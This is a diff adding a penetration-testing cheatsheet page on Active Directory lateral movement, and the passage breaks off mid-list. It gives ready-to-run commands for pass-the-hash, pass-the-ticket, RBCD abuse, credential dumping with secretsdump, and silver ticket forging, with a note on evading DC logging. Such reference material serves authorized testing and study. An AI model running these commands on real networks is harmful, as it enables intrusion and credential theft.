@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lateral Movement | JinPwn</title><meta name="description" content="AD-specific lateral movement: Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, Kerberos abuse. For the impacket/nxc tool mechanics, see Lateral Movement .">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/active-directory/ad10-lateral-movement/">
+<meta property="og:title" content="Lateral Movement | JinPwn">
+<meta property="og:description" content="AD-specific lateral movement: Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, Kerberos abuse. For the impacket/nxc tool mechanics, see Lateral Movement .">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/active-directory/ad10-lateral-movement/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Lateral Movement | JinPwn">
+<meta name="twitter:description" content="AD-specific lateral movement: Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, Kerberos abuse. For the impacket/nxc tool mechanics, see Lateral Movement .">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"AD-specific lateral movement: Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, Kerberos abuse. For the impacket/nxc tool mechanics, see Lateral Movement .","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Lateral Movement | JinPwn","url":"https://jinpwn.dev/cheatsheets/active-directory/ad10-lateral-movement/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Active Directory Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/active-directory/" class="cheatsheet-sidebar-section">Active Directory Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-sidebar-link">AD MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-sidebar-link">Enumeration</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-sidebar-link">BloodHound</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-sidebar-link">Kerberoasting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-sidebar-link">AS-REP Roasting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-sidebar-link">Password Spraying</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-sidebar-link">LLMNR &amp; NTLM Relay</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-sidebar-link">ACL Abuse</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-sidebar-link">Delegation</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-sidebar-link">ADCS ESC1-16</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-sidebar-link is-current">Lateral Movement</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-sidebar-link">Credential Dumping</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-sidebar-link">DCSync</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-sidebar-link">Trust Attacks</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-sidebar-link">Persistence</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>Lateral Movement</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">Lateral Movement</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Active Directory Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/active-directory/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-mobile-sections-link">AD MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-mobile-sections-link">Enumeration</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-mobile-sections-link">BloodHound</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-mobile-sections-link">Kerberoasting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-mobile-sections-link">AS-REP Roasting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-mobile-sections-link">Password Spraying</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-mobile-sections-link">LLMNR &amp; NTLM Relay</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-mobile-sections-link">ACL Abuse</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-mobile-sections-link">Delegation</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-mobile-sections-link">ADCS ESC1-16</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-mobile-sections-link is-current">Lateral Movement</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-mobile-sections-link">Credential Dumping</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-mobile-sections-link">DCSync</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-mobile-sections-link">Trust Attacks</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-mobile-sections-link">Persistence</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>AD-specific lateral movement: Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, Kerberos abuse. For the impacket/nxc tool mechanics, see <a href="https://jinpwn.dev/cheatsheets/windows/w11-lateral-movement/">Lateral Movement</a>
+.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DC</span><span class="o">=</span>10.10.11.50
+</span></span><span class="line"><span class="cl"><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
+</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;svc_user&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">NTHASH</span><span class="o">=</span><span class="s1">&#39;8846f7eaee8fb117ad06bdd830b7586c&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AESKEY</span><span class="o">=</span><span class="s1">&#39;b8f62a5f9ba0c8d3e7a2c1b4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4&#39;</span>
+</span></span></code></pre></div><h2 id="i-pass-the-hash-pth" data-heading-permalink="true"><span class="heading-content">i. Pass-the-Hash (PtH)</span>
+    <a class="heading-permalink" href="#i-pass-the-hash-pth" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Use an NTLM hash as if it were a password. Works for any NTLM-based service.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u <span class="nv">$USER</span> -H <span class="nv">$NTHASH</span>
+</span></span><span class="line"><span class="cl">nxc winrm <span class="nv">$DC</span> -u <span class="nv">$USER</span> -H <span class="nv">$NTHASH</span>
+</span></span><span class="line"><span class="cl">impacket-psexec -hashes :<span class="nv">$NTHASH</span> <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">&#34;</span>@<span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl">impacket-wmiexec -hashes :<span class="nv">$NTHASH</span> <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">&#34;</span>@<span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl">evil-winrm -i <span class="nv">$DC</span> -u <span class="nv">$USER</span> -H <span class="nv">$NTHASH</span>
+</span></span></code></pre></div><p>RDP with PtH needs Restricted Admin Mode on the target:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xfreerdp /v:<span class="nv">$DC</span> /u:<span class="nv">$USER</span> /pth:<span class="nv">$NTHASH</span> /restricted-admin /dynamic-resolution
+</span></span></code></pre></div><h2 id="ii-pass-the-key--overpass-the-hash" data-heading-permalink="true"><span class="heading-content">ii. Pass-the-Key / Overpass-the-Hash</span>
+    <a class="heading-permalink" href="#ii-pass-the-key--overpass-the-hash" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Use an AES key (more powerful than NTLM hash because it satisfies the AES-only Kerberos policy):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Get a TGT with AES key</span>
+</span></span><span class="line"><span class="cl">impacket-getTGT <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span> -aesKey <span class="nv">$AESKEY</span> -dc-ip <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/<span class="nv">$USER</span>.ccache
+</span></span><span class="line"><span class="cl">impacket-psexec -k -no-pass <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@host.<span class="nv">$DOMAIN</span>
+</span></span></code></pre></div><p>Get the AES key from a secretsdump output (it&rsquo;s listed alongside NTLM):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -just-dc-ntlm-history <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASS</span>@<span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## AES keys also dumped in secretsdump output</span>
+</span></span></code></pre></div><p>Rubeus equivalent (Windows):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">Rubeus.exe asktgt /user:Administrator /aes256:KEY /domain:corp.local /dc:10.10.11.50 /ptt
+</span></span></code></pre></div><h2 id="iii-pass-the-ticket-ptt---using-a-ccache" data-heading-permalink="true"><span class="heading-content">iii. Pass-the-Ticket (PtT) - using a ccache</span>
+    <a class="heading-permalink" href="#iii-pass-the-ticket-ptt---using-a-ccache" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Linux side:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Set ccache file</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/path/to/user.ccache
+</span></span><span class="line"><span class="cl"><span class="c1">## Use it for any impacket tool with -k -no-pass:</span>
+</span></span><span class="line"><span class="cl">impacket-psexec -k -no-pass <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@host.<span class="nv">$DOMAIN</span>
+</span></span><span class="line"><span class="cl">impacket-wmiexec -k -no-pass <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@host.<span class="nv">$DOMAIN</span>
+</span></span><span class="line"><span class="cl">impacket-secretsdump -k -no-pass <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@host.<span class="nv">$DOMAIN</span>
+</span></span><span class="line"><span class="cl">nxc smb host.<span class="nv">$DOMAIN</span> -k --use-kcache
+</span></span></code></pre></div><div class="obsidian-callout callout-warning">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+          <path d="M12 9v4"></path>
+          <path d="M12 17h.01"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">FQDN, not IP</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>Kerberos is hostname-based. Connect to <code>host.corp.local</code> not <code>10.10.11.50</code>. Update <code>/etc/hosts</code> or use <code>--dns-server</code> so the FQDN resolves.</p>
+  </div>
+</div>
+<p>Windows side via Rubeus:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">Rubeus.exe ptt /ticket:base64-or-file.kirbi
+</span></span><span class="line"><span class="cl">klist
+</span></span></code></pre></div><h2 id="iv-convert-tickets-between-formats" data-heading-permalink="true"><span class="heading-content">iv. Convert tickets between formats</span>
+    <a class="heading-permalink" href="#iv-convert-tickets-between-formats" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Kirbi (Windows binary) &lt;-&gt; ccache (Linux):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-ticketConverter ticket.kirbi ticket.ccache
+</span></span><span class="line"><span class="cl">impacket-ticketConverter ticket.ccache ticket.kirbi
+</span></span></code></pre></div><h2 id="v-get-a-tgt-in-one-shot" data-heading-permalink="true"><span class="heading-content">v. Get a TGT in one shot</span>
+    <a class="heading-permalink" href="#v-get-a-tgt-in-one-shot" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you have password / hash / AES key, get a TGT for later PtT use:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Password</span>
+</span></span><span class="line"><span class="cl">impacket-getTGT <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## NT hash</span>
+</span></span><span class="line"><span class="cl">impacket-getTGT <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span> -hashes :<span class="nv">$NTHASH</span> -dc-ip <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## AES key</span>
+</span></span><span class="line"><span class="cl">impacket-getTGT <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span> -aesKey <span class="nv">$AESKEY</span> -dc-ip <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Output: $USER.ccache in CWD</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/<span class="nv">$USER</span>.ccache
+</span></span></code></pre></div><h2 id="vi-s4u2self-to-elevate-the-tgts-privileges" data-heading-permalink="true"><span class="heading-content">vi. S4U2self to elevate the TGT&rsquo;s privileges</span>
+    <a class="heading-permalink" href="#vi-s4u2self-to-elevate-the-tgts-privileges" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you have a computer account&rsquo;s hash, S4U2self lets you ask for a TGS where the impersonated user is Administrator. The TGS isn&rsquo;t forwardable but is enough for most impacket operations:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-getST -spn <span class="s1">&#39;cifs/target.corp.local&#39;</span> -impersonate Administrator <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">/computer\$:</span><span class="nv">$COMPUTERPASS</span><span class="s2">&#34;</span> -dc-ip <span class="nv">$DC</span>
+</span></span></code></pre></div><p>Full chain in <a href="https://jinpwn.dev/cheatsheets/active-directory/ad08-delegation/">Delegation</a>
+.</p>
+<h2 id="vii-lateral-via-kerberos-delegation-rbcd" data-heading-permalink="true"><span class="heading-content">vii. Lateral via Kerberos delegation (RBCD)</span>
+    <a class="heading-permalink" href="#vii-lateral-via-kerberos-delegation-rbcd" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>The most useful &ldquo;I have GenericWrite on a computer&rdquo; lateral path:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Configure RBCD</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> add computer attackerpc <span class="s1">&#39;AttackerP@ss&#39;</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> add rbcd <span class="s1">&#39;victim$&#39;</span> <span class="s1">&#39;attackerpc$&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Get a TGS as any user, against victim</span>
+</span></span><span class="line"><span class="cl">impacket-getST -spn <span class="s1">&#39;cifs/victim.corp.local&#39;</span> -impersonate Administrator <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">/attackerpc\$:AttackerP@ss&#34;</span> -dc-ip <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@cifs_victim.corp.local@CORP.LOCAL.ccache
+</span></span><span class="line"><span class="cl">impacket-psexec -k -no-pass victim.corp.local
+</span></span></code></pre></div><p>See <a href="https://jinpwn.dev/cheatsheets/active-directory/ad08-delegation/">Delegation</a>
+ for details and cleanup.</p>
+<h2 id="viii-local-admin-from-domain-admin-tgt" data-heading-permalink="true"><span class="heading-content">viii. Local admin from domain admin TGT</span>
+    <a class="heading-permalink" href="#viii-local-admin-from-domain-admin-tgt" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Once you have a DA TGT, you&rsquo;re admin everywhere:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/Administrator.ccache
+</span></span><span class="line"><span class="cl"><span class="c1">## Any host:</span>
+</span></span><span class="line"><span class="cl">impacket-psexec -k -no-pass dc.<span class="nv">$DOMAIN</span>
+</span></span><span class="line"><span class="cl">impacket-psexec -k -no-pass ws01.<span class="nv">$DOMAIN</span>
+</span></span><span class="line"><span class="cl">impacket-secretsdump -k -no-pass dc.<span class="nv">$DOMAIN</span>
+</span></span></code></pre></div><h2 id="ix-kerberos-through-a-socks-pivot" data-heading-permalink="true"><span class="heading-content">ix. Kerberos through a SOCKS pivot</span>
+    <a class="heading-permalink" href="#ix-kerberos-through-a-socks-pivot" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you have a foothold inside the AD network and you want to use impacket from your attacker box:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Set up SOCKS via chisel/ligolo, see [Pivoting](https://jinpwn.dev/cheatsheets/misc/pivoting/)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Add domain entries to /etc/hosts on attacker:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$DC</span><span class="s2"> dc.</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span><span class="line"><span class="cl"><span class="c1">## Get TGT through the proxy:</span>
+</span></span><span class="line"><span class="cl">proxychains -q impacket-getTGT <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/<span class="nv">$USER</span>.ccache
+</span></span><span class="line"><span class="cl"><span class="c1">## Use it:</span>
+</span></span><span class="line"><span class="cl">proxychains -q impacket-psexec -k -no-pass dc.<span class="nv">$DOMAIN</span>
+</span></span></code></pre></div><div class="obsidian-callout callout-tip">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">krb5.conf for SOCKS</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>Kerberos client checks the file pointed to by <code>KRB5_CONFIG</code> (or <code>/etc/krb5.conf</code> if unset) for KDC IPs. With a pivot, the KDC isn&rsquo;t reachable directly. Either route everything through proxychains, or add the DC IP to /etc/hosts and configure a per-engagement krb5 config to use the DC FQDN, then proxychains handles the actual connection.</p>
+  </div>
+</div>
+<p>Per-engagement krb5 config without touching the system file:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> --generate-krb5-file krb5.<span class="nv">$DOMAIN</span>.conf
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5_CONFIG</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/krb5.<span class="nv">$DOMAIN</span>.conf
+</span></span></code></pre></div><p>Or write it by hand:</p>
+<pre tabindex="0"><code>[libdefaults]
+    default_realm = CORP.LOCAL
+[realms]
+    CORP.LOCAL = {
+        kdc = dc.corp.local
+        admin_server = dc.corp.local
+    }
+[domain_realm]
+    .corp.local = CORP.LOCAL
+    corp.local = CORP.LOCAL
+</code></pre><h2 id="x-silver-ticket---forge-a-service-ticket-directly" data-heading-permalink="true"><span class="heading-content">x. Silver Ticket - forge a service ticket directly</span>
+    <a class="heading-permalink" href="#x-silver-ticket---forge-a-service-ticket-directly" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you have a service account&rsquo;s NT hash (kerberoasted, dumped, etc), you can forge a TGS for that service directly, no DC interaction needed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-ticketer -nthash <span class="nv">$SERVICE_NTHASH</span> -domain-sid <span class="nv">$DOMAIN_SID</span> -domain <span class="nv">$DOMAIN</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -spn cifs/server.corp.local Administrator
+</span></span><span class="line"><span class="cl"><span class="c1">## Output: Administrator.ccache</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+</span></span><span class="line"><span class="cl">impacket-psexec -k -no-pass server.corp.local
+</span></span></code></pre></div><p>Silver tickets:</p>
+<ul>
+<li>Don&rsquo;t touch the DC, no Event 4768/4769 from your attack</li>
+<li>Survive password resets of normal user accounts (only the service hash needs to remain valid)</li>
